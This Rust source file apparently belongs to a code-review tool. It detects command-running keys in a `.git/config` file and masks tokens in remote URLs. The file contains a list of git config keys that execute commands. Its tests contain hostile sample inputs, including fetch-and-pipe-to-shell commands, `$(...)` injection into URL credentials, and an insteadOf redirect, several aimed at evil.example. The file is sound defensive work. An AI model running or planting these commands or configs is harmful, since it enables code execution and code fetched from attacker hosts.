//! Checks a `.git/config` found in a reviewed tree for keys that make git
//! run a command.
//!
//! `git clone` never carries a repository's config or hooks, but a tree that
//! arrives as an archive or a copied checkout does, and a later `git status`
//! or `git describe` in it (a build often runs one) runs whatever
//! `core.fsmonitor` or a filter names. The config is checked here and never
//! sent to the AI, since remote URLs can carry tokens.

/// The directories git keeps in a git directory: no submodule is in one
/// (those under `modules` are looked into by name).
pub const OWN_DIRECTORIES: &[&str] = &[
    "objects",
    "refs",
    "hooks",
    "info",
    "logs",
    "modules",
    "worktrees",
    "branches",
    "lfs",
    "rr-cache",
    "svn",
];

/// Keys that name a command git runs, or send it to another address than
/// the one written, as `section.key`, `section.*.key` for any subsection,
/// or `section.*` for every key in the section. Checked against
/// git-config(1) and git-archive(1).
const EXECUTING_KEYS: &[&str] = &[
    "core.fsmonitor",
    "core.hookspath",
    "core.sshcommand",
    "core.pager",
    "core.editor",
    "core.askpass",
    "core.gitproxy",
    "sequence.editor",
    "credential.helper",
    "credential.*.helper",
    "gpg.program",
    "gpg.*.program",
    "filter.*.clean",
    "filter.*.smudge",
    "filter.*.process",
    "diff.*.textconv",
    "diff.*.command",
    "diff.external",
    "merge.*.driver",
    "include.path",
    "includeif.*.path",
    "uploadpack.packobjectshook",
    "protocol.ext.allow",
    "pager.*",
    "core.alternaterefscommand",
    "submodule.*.update",
    "remote.*.uploadpack",
    "remote.*.receivepack",
    "remote.*.vcs",
    "difftool.*.cmd",
    "mergetool.*.cmd",
    "trailer.*.command",
    "trailer.*.cmd",
    "gpg.*.defaultkeycommand",
    // Hooks defined in the configuration itself.
    "hook.*.command",
    // What `git archive` pipes its output through.
    "tar.*.command",
    "interactive.difffilter",
    "imap.tunnel",
    "browser.*.cmd",
    "man.*.cmd",
    "guitool.*.cmd",
    "sendemail.sendmailcmd",
    "sendemail.tocmd",
    "sendemail.cccmd",
    "sendemail.headercmd",
    "instaweb.httpd",
    // No command, but another address than the one written: a later
    // `git fetch` or `git submodule update` in the tree gets its code
    // from wherever these point.
    "url.*.insteadof",
    "url.*.pushinsteadof",
];

/// Whether `rel` is a git config file the walk reviews: a `.git/config`, or a
/// submodule's under `.git/modules/`.
pub fn is_git_config(rel: &str) -> bool {
    let mut components = rel.split('/').rev();
    matches!(components.next(), Some("config" | "config.worktree"))
        && rel.split('/').any(|component| component == ".git")
}

/// `text` with the user and password of every `scheme://user:secret@host`
/// taken out (`scheme://***@host`): a git configuration's remote addresses
/// can carry tokens, and the rest of it is what a review needs to see.
pub fn without_url_credentials(text: &str) -> String {
    text.split_inclusive('\n')
        .map(|line| without_basic_credential(&without_line_credentials(line)))
        .collect()
}

/// An `extraHeader = Authorization: basic <base64>` line with the base64
/// taken out, when it decodes to a `user:password` and nothing else (no
/// blank, nothing a shell would act on): what git sends as a login, which
/// can hide no code. Any other value is kept.
fn without_basic_credential(line: &str) -> String {
    let Some((key, value)) = line.split_once('=') else {
        return line.to_string();
    };
    let name = key.trim().to_ascii_lowercase();
    let words: Vec<&str> = value.split_whitespace().collect();
    let [header, scheme, credential] = words.as_slice() else {
        return line.to_string();
    };
    let login = |decoded: &str| {
        decoded.split_once(':').is_some_and(|(user, password)| {
            !user.is_empty()
                && !password.is_empty()
                && decoded
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "._~%+=-:@!".contains(c))
        })
    };
    let masks = (name == "extraheader" || name.ends_with(".extraheader"))
        && header.eq_ignore_ascii_case("authorization:")
        && scheme.eq_ignore_ascii_case("basic")
        && base64_text(credential).is_some_and(|decoded| login(&decoded));
    if !masks {
        return line.to_string();
    }
    let ending = if line.ends_with('\n') { "\n" } else { "" };
    format!("{key}= {header} {scheme} ***{ending}")
}

/// Standard base64 (padding optional) decoded to UTF-8 text.
fn base64_text(encoded: &str) -> Option<String> {
    let mut bits = 0_u32;
    let mut count = 0;
    let mut bytes = Vec::with_capacity(encoded.len() * 3 / 4);
    for character in encoded.trim_end_matches('=').chars() {
        let value = match character {
            'A'..='Z' => u32::from(character) - u32::from('A'),
            'a'..='z' => u32::from(character) - u32::from('a') + 26,
            '0'..='9' => u32::from(character) - u32::from('0') + 52,
            '+' => 62,
            '/' => 63,
            _ => return None,
        };
        bits = (bits << 6) | value;
        count += 6;
        if count >= 8 {
            count -= 8;
            bytes.push(u8::try_from((bits >> count) & 0xff).ok()?);
        }
    }
    String::from_utf8(bytes).ok()
}

/// Whether `text` is written as a credential is: nothing in it a shell
/// would act on, so taking it out hides no code.
fn is_plain_secret(text: &str) -> bool {
    !text.is_empty()
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=-:".contains(c))
}

fn without_line_credentials(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut rest = line;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| c.is_whitespace() || matches!(c, '/' | '"' | '\'' | '?' | '#'))
            .unwrap_or(after.len());
        let authority = &after[..end];
        match authority.rsplit_once('@') {
            Some((userinfo, host)) if is_plain_secret(userinfo) && !userinfo.contains(' ') => {
                out.push_str("***@");
                out.push_str(host);
            }
            _ => out.push_str(authority),
        }
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}

/// The lines of `text` that set a key running a command, as (line number,
/// `key = value` with any URL credentials masked).
pub fn executing_keys(text: &str) -> Vec<(usize, String)> {
    // The sections a key may belong to. Usually one; after a header that
    // may itself be the tail of a continued value, also the ones before.
    let mut sections: Vec<(String, Option<String>)> = vec![(String::new(), None)];
    let mut hits: Vec<(usize, String)> = Vec::new();
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let lines: Vec<&str> = text.lines().collect();
    for (index, raw) in lines.iter().enumerate() {
        // Where git continues a line onto the next depends on quotes,
        // comments and how many backslashes end it. Rather than repeat
        // those rules, a line ending in a backslash is read both ways, on
        // its own and joined with what follows, and what comes after it is
        // read both as a line of its own and as more of that value: a key
        // that runs a command in any reading is reported.
        let continued = index > 0 && lines[index - 1].ends_with('\\');
        let mut readings = vec![(*raw).to_string()];
        if raw.ends_with('\\') {
            let mut joined = (*raw).to_string();
            let mut next = index + 1;
            while joined.ends_with('\\') {
                joined.pop();
                match lines.get(next) {
                    Some(line) => joined.push_str(line),
                    None => break,
                }
                next += 1;
            }
            readings.push(joined);
        }
        for (reading_index, reading) in readings.into_iter().enumerate() {
            let mut line = reading.trim();
            if let Some(header) = line.strip_prefix('[') {
                let (header, rest) = split_header(header);
                let header = header.trim();
                let found = if let Some((name, sub)) = header.split_once(char::is_whitespace) {
                    (
                        name.to_lowercase(),
                        Some(sub.trim().trim_matches('"').to_string()),
                    )
                } else if let Some((name, sub)) = header.split_once('.') {
                    (name.to_lowercase(), Some(sub.to_string()))
                } else {
                    (header.to_lowercase(), None)
                };
                // Only the line as it stands opens a section; if it may be
                // the rest of a value, the sections before stay too.
                if reading_index == 0 {
                    if !continued {
                        sections.clear();
                    }
                    if !sections.contains(&found) {
                        sections.push(found);
                    }
                }
                // A key may follow its section on the same line.
                line = rest.trim();
            }
            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
                continue;
            }
            let (key, value) = line
                .split_once('=')
                .map_or((line, "true"), |(key, value)| (key.trim(), value.trim()));
            let key = key.to_lowercase();
            for (section, subsection) in &sections {
                if !runs_command(section, subsection.is_some(), &key, value) {
                    continue;
                }
                let full = subsection.as_ref().map_or_else(
                    || format!("{section}.{key}"),
                    |sub| format!("{section}.{sub}.{key}"),
                );
                let hit = (index + 1, format!("{full} = {}", mask_credentials(value)));
                if !hits.contains(&hit) {
                    hits.push(hit);
                }
            }
        }
    }
    hits
}

/// A section header (without its `[`) and what follows its closing `]`,
/// which a quoted subsection may itself contain (`[remote "a]b"]`).
fn split_header(header: &str) -> (&str, &str) {
    let mut quoted = false;
    let mut escaped = false;
    for (index, character) in header.char_indices() {
        match character {
            _ if escaped => escaped = false,
            '\\' if quoted => escaped = true,
            '"' => quoted = !quoted,
            ']' if !quoted => return (&header[..index], &header[index + 1..]),
            _ => {}
        }
    }
    (header, "")
}

fn runs_command(section: &str, has_subsection: bool, key: &str, value: &str) -> bool {
    // As git takes a value: quotes group and are dropped (`"" !x` is
    // `!x`), and blanks around it do not count.
    let value = value.replace('"', "");
    let value = value.trim();
    // An empty value clears a list (`credential.helper =`); it runs nothing.
    if value.is_empty() {
        return false;
    }
    if section == "alias" {
        return value.starts_with('!');
    }
    // `submodule.<name>.update` is a mode (`checkout`, `rebase`, `none`),
    // or a command behind `!`.
    if section == "submodule" && key == "update" {
        return value.starts_with('!');
    }
    // `core.fsmonitor = true/false` switches the built-in daemon.
    if section == "core" && key == "fsmonitor" {
        return !matches!(
            value.to_lowercase().as_str(),
            "true" | "false" | "yes" | "no" | "on" | "off" | "1" | "0" | ""
        );
    }
    // Hooks in a directory of the tree (husky's `.husky/_`) are files the
    // walk reviews anyway.
    if section == "core" && key == "hookspath" && is_in_tree(value) {
        return false;
    }
    EXECUTING_KEYS.iter().any(|pattern| {
        let mut parts = pattern.split('.');
        let (Some(name), Some(second)) = (parts.next(), parts.next()) else {
            return false;
        };
        if name != section {
            return false;
        }
        match (second, parts.next()) {
            ("*", None) => true,
            ("*", Some(last)) => has_subsection && last == key,
            (only, None) => !has_subsection && only == key,
            _ => false,
        }
    })
}

/// A relative path that stays inside the working tree, and outside the
/// git directory, whose files the walk reads only in part.
fn is_in_tree(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with(['/', '~'])
        && !path.contains('$')
        && path
            .split('/')
            .all(|component| component != ".." && component != ".git")
}

/// `scheme://user:secret@host` becomes `scheme://***@host`.
fn mask_credentials(value: &str) -> String {
    let Some((scheme, rest)) = value.split_once("://") else {
        return value.to_string();
    };
    match rest.split_once('@') {
        Some((credentials, host))
            if is_plain_secret(credentials) && !credentials.contains(['/', ' ']) =>
        {
            format!("{scheme}://***@{host}")
        }
        _ => value.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::{executing_keys, is_git_config};

    fn keys(text: &str) -> Vec<String> {
        executing_keys(text)
            .into_iter()
            .map(|(_, hit)| hit)
            .collect()
    }

    #[test]
    fn commands_are_flagged_and_switches_are_not() {
        assert_eq!(
            keys("[core]\n\tfsmonitor = \"touch /tmp/p\"\n\tbare = false\n"),
            ["core.fsmonitor = \"touch /tmp/p\""]
        );
        assert!(keys("[core]\n\tfsmonitor = true\n").is_empty());
        assert_eq!(
            keys("[alias]\n\tx = !sh -c id\n\ty = log\n"),
            ["alias.x = !sh -c id"]
        );
        assert_eq!(keys("[include]\n\tpath = ../x\n"), ["include.path = ../x"]);
        assert_eq!(
            keys("[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n"),
            ["filter.lfs.smudge = git-lfs smudge -- %f"]
        );
        assert!(keys("[remote \"origin\"]\n\turl = https://h/r.git\n").is_empty());
        // What `git archive` pipes through, and an address that stands in
        // for the one a submodule or remote is written with.
        assert_eq!(
            keys("[tar \"tar.xz\"]\n\tcommand = sh -c 'touch x; xz -c'\n\tremote = true\n"),
            ["tar.tar.xz.command = sh -c 'touch x; xz -c'"]
        );
        assert!(keys("[tar]\n\tumask = 022\n").is_empty());
        assert_eq!(
            keys(
                "[url \"https://evil.example/\"]\n\tinsteadOf = https://github.com/\n\tpushInsteadOf = git@github.com:\n"
            ),
            [
                "url.https://evil.example/.insteadof = https://github.com/",
                "url.https://evil.example/.pushinsteadof = git@github.com:"
            ]
        );
        assert_eq!(
            keys("[interactive]\n\tdiffFilter = sh x\n[man \"x\"]\n\tcmd = sh x\n").len(),
            2
        );
        assert!(keys("[core]\n\thooksPath = .husky/_\n").is_empty());
        assert!(keys("[credential]\n\thelper =\n").is_empty());
        assert_eq!(
            keys("[core]\n\thooksPath = ../../x\n"),
            ["core.hookspath = ../../x"]
        );
    }

    #[test]
    fn the_config_is_read_the_way_git_reads_it() {
        let keys = |text: &str| -> Vec<String> {
            executing_keys(text)
                .into_iter()
                .map(|(line, excerpt)| format!("{line}:{excerpt}"))
                .collect()
        };
        // A key on its section's line, a byte-order mark, a continued line.
        assert_eq!(
            keys("[core] fsmonitor = sh x\n"),
            ["1:core.fsmonitor = sh x"]
        );
        assert_eq!(
            keys("\u{feff}[core]\n\tfsmonitor = sh x\n"),
            ["2:core.fsmonitor = sh x"]
        );
        assert_eq!(
            keys("[core]\n\tfsmoni\\\ntor = sh x\n\tbare = false\n"),
            ["2:core.fsmonitor = sh x"]
        );
        // A value ending in an escaped backslash, or in a comment that
        // ends in one, does not swallow the next line either; and a `]`
        // inside a quoted subsection does not end the header.
        assert_eq!(
            keys("[core]\n\tbare = x\\\\\n\tfsmonitor = sh x\n"),
            ["3:core.fsmonitor = sh x"]
        );
        assert_eq!(
            keys("[core]\n\tbare = x # c \\\n\tfsmonitor = sh x\n"),
            ["3:core.fsmonitor = sh x"]
        );
        assert_eq!(
            keys("[remote \"a]b\"] uploadpack = sh x\n"),
            ["1:remote.a]b.uploadpack = sh x"]
        );
        // A header that may be the rest of a continued value does not
        // take the keys after it out of the section before.
        assert_eq!(
            keys("[core]\n\tx = a\\\n[alias]\n\tfsmonitor = sh x\n"),
            ["4:core.fsmonitor = sh x"]
        );
        // Quotes around nothing do not hide what a value starts with.
        assert_eq!(
            keys("[alias]\n\tx = \"\" !sh x\n\ty = \"\" \"!sh y\"\n\tz = status\n").len(),
            2
        );
        // A comment ending in a backslash does not swallow the next line.
        assert_eq!(
            keys("[core]\n# note \\\n\tfsmonitor = sh x\n"),
            ["3:core.fsmonitor = sh x"]
        );
        assert!(keys("[submodule \"a\"]\n\tupdate = rebase\n").is_empty());
        // Hooks kept inside the git directory are not files the walk reads.
        assert_eq!(
            keys("[core]\n\thooksPath = .git/x\n\thooksPath = .husky/_\n"),
            ["2:core.hookspath = .git/x"]
        );
        // More keys that name a command.
        let text = "[submodule \"a\"]\n\tupdate = !sh x\n[remote \"origin\"]\n\tuploadpack = sh x\n\turl = https://x.example/r\n[difftool \"d\"]\n\tcmd = sh x\n[gpg \"ssh\"]\n\tdefaultKeyCommand = sh x\n";
        assert_eq!(keys(text).len(), 4, "{:?}", keys(text));
    }

    #[test]
    fn credentials_in_a_flagged_value_are_masked() {
        assert_eq!(
            keys("[core]\n\tsshCommand = ssh https://me:tok@h/x\n"),
            ["core.sshcommand = ssh https://***@h/x"]
        );
    }

    #[test]
    fn git_config_paths_are_recognised() {
        assert_eq!(
            super::without_url_credentials(
                "[remote \"o\"]\n\turl = https://ghp_x:y@github.com/a/b\n\turl = https://tok@x.example\n\turl = git@github.com:a/b\nrun = curl https://x.example/i | sh\n"
            ),
            "[remote \"o\"]\n\turl = https://***@github.com/a/b\n\turl = https://***@x.example\n\turl = git@github.com:a/b\nrun = curl https://x.example/i | sh\n"
        );
        // A basic login git sends (`x:yyz73`) is taken out.
        assert_eq!(
            super::without_url_credentials("\textraheader = AUTHORIZATION: basic eDp5eXo3Mw==\n"),
            "\textraheader = AUTHORIZATION: basic ***\n"
        );
        // Values are kept whatever their key is called when they could be
        // code or name what a file runs: base64 of a command is not a login.
        for line in [
            "\ttoken = ghp_abcdef123456\n",
            "PASS=Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\n",
            "\textraheader = AUTHORIZATION: basic Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\n",
            "\textraheader = AUTHORIZATION: bearer eDp5eXo3Mw==\n",
        ] {
            assert_eq!(super::without_url_credentials(line), line);
        }
        // What a shell would act on is never taken out.
        for line in [
            "x = http://;curl${IFS}-s${IFS}evil.example|sh;@h\n",
            "x = http://$(curl${IFS}evil.example|sh)@h\n",
            "token = $(curl evil.example | sh)\n",
            "PASS=1 curl -fsSL http://evil.example/i -o /tmp/i\n",
            "TOKEN=x sh /tmp/i\n",
            "python3 install_pass.py --url=http://evil.example/x.py\n",
            "token = curl -fsSL x.example/i -o /tmp/i\n",
            "SECRET_URL=https://evil.example/x.sh\n",
            "PASS=/tmp/payload.sh\n",
            "SECRET=sys.executable\n",
            "askPass = /tmp/evil.sh\n",
            "\taskpass = ghp_abcdef123456\n",
        ] {
            assert_eq!(super::without_url_credentials(line), line);
        }
        assert!(is_git_config(".git/config"));
        assert!(is_git_config("sub/.git/modules/lib/config"));
        assert!(!is_git_config("config"));
        assert!(!is_git_config(".git/hooks/pre-commit"));
    }
}
